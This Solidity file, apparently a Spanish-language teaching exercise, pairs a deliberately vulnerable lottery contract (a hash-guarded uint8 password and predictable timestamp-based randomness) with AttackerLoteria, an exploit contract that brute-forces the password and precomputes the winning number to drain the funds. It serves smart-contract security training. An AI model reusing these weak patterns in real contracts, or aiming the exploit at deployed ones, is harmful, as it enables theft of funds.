// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
 * El contrato LoteriaConPassword permite que las personas participen en una lotería
 * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
 *
 * Para poder participar, una persona provee tres elementos:
 * 1. El password
 * 2. Un número (preddicción) de un número entero (uint256)
 * 3. Una cantidad de 1500 o 1500 wei
 *
 * De acuerdo a los tests, el contrato LoteriaConPassword comienza con un balance de 1500 wei o 1500
 * El objetivo es drenar los fondos del contrato LoteriaConPassword
 *
 * Para ello se desarrollará el contrato AttackerLoteria
 * El contrato AttackerLoteria ejecutará el método attack()
 * Al hacerlo, participará en la lotería:
 * - apostando 1500 wei o 1500 (según el require de LoteriaConPassword)
 * - "adivinando" el número ganador
 * - "conociendo" el password
 *
 * La operación termina cuando el contrato AttackerLoteria gana la lotería
 *
 * Nota:
 * - No cambiar la firma del método attack()
 * - Asumir que cuando attack() es llamado, el contrato AttackerLoteria posee un balance de Ether
 *
 * ejecuar el test con:
 * npx hardhat test test/DesafioTesting_8.js
 */

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "./MiPrimerToken.sol";
import "./Desafio_7.sol";

contract LoteriaConPassword {
    constructor() payable {
        //el test envia 1500, el siguiente require no es necesario
        //require(msg.value == 1500, "Balance inicial incorrecto");

        /* */
        //Comprobando que se puede deployar al vuelo otro Contrato
        //Porque se ha puesto en el constructor? porque funciona. 
        //En cambio si lo pongo en una funcion hay un limite y sale un error => Error: Transaction reverted: trying to deploy a contract whose code is too large
		//Warning: Contract code size is 26051 bytes and exceeds 24576 bytes (a limit introduced in Spurious Dragon). This contract may not be deployable on Mainnet. Consider enabling the optimizer (with a low "runs" value!), turning off revert strings, or using libraries.
        //Lo anterior si funciona en una funcion si se retira la linea del console.log
        MiPrimerToken miPrimerToken = new MiPrimerToken("Mi Primer Token", "MPRTKN");
        AirdropTwo airdropTwo = new AirdropTwo(address(miPrimerToken));
        miPrimerToken.grantRole(keccak256("MINTER_ROLE"), address(airdropTwo));
        miPrimerToken.mint(address(airdropTwo), 100000 * 10**18);
        console.log(miPrimerToken.balanceOf(address(airdropTwo)));
        /* */
    }

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(
        uint8 password,
        uint256 _numeroGanador
    ) public payable {

        //console.log("---- entrando a participarEnLoteria ----");

        require(msg.value == 1500, "Cantidad apuesta incorrecta");
        require(
            uint256(keccak256(abi.encodePacked(password))) == FACTOR,
            "No es el hash correcto"
        );

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    tx.origin,
                    block.timestamp,
                    msg.sender
                )
            )
        );

        uint256 numeroGanador = numRandom % 10;

        //console.log(address(this).balance);

        if (numeroGanador == _numeroGanador) {
            //llama al metodo receive de AttackerLoteria
            payable(msg.sender).transfer(msg.value * 2);
        }
    }

}

/*
interface ILoteria {
    function participarEnLoteria(uint8 password, uint256 _numeroGanador) external payable;
}
*/

contract AttackerLoteria {

    uint256 public FACTOR = 104312904618913870938864605146322161834075447075422067288548444976592725436353;

    receive() external payable {
    }

    function attack(address _sc) public payable {

        uint8 password;
        uint256 numeroGanador;

        for(uint8 num = 0; num<=255; num++){
            if(uint256(keccak256(abi.encodePacked(num))) == FACTOR){
                password = num;
                break;
            }
        }

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    msg.sender,//tx.origin,
                    block.timestamp,
                    address(this)
                )
            )
        );
       
        numeroGanador = numRandom % 10;
    
        /*
        console.log(msg.value);
        console.log(tx.origin);
        console.log(msg.sender);
        console.log(block.timestamp);
        console.log(address(this));
        console.log(numRandom); 
        console.log(numeroGanador);
        */

        console.log(address(this).balance);

        //el pago del gas sale del tx.origin (es decir de la billetera que inició la transacción)

        //value: 1500 = 1500 wei | 1 ether = 1 * 10**18 = 1 * 10**18 wei
        //cuando se refiera a este value, si se omite la 'unidad' es la minima unidad del token (wei), es decir contando la parte decimal
        //cuando por ejemplo en un airdrop se habla de repartir 10 millones de tokens, se refiere a la unidad entera del token (sin contar la parte decimal)
        //Para "call" no es necesario payable(_sc)
        //"send" and "transfer" are only available for objects of type "address payable", not "address".
        (bool success, ) = _sc.call{value: 1500 }( 
            abi.encodeWithSignature(
                "participarEnLoteria(uint8,uint256)",
                password,
                numeroGanador
            )
        );

        require(success, "error");

        /*
        ILoteria loteria = ILoteria(_sc);
        loteria.participarEnLoteria{value: 1500}(password, numeroGanador);
        */
    }

}

/*

Comentarios:
        
        uint8 password;
        uint256 numeroGanador;

        //1era forma => via interface

        interface ILoteria {
            function participarEnLoteria(uint8 password, uint256 _numeroGanador) external payable;
        }

        ILoteria loteria = ILoteria(_sc);
        loteria.participarEnLoteria{value: 1500}(password, numeroGanador);

        //2da forma => sin interface (transfer/send/call)
        
        //Ejem usando call:

        (bool success, bytes memory returndata) = _sc.call{value: 1500, gas: 5000000}(
            abi.encodeWithSignature("participarEnLoteria(uint8,uint256)", password, numeroGanador)
        );

        console.log(success);
        if(returndata.length != 0){
            console.log(abi.decode(returndata, (bool)));
        }

*/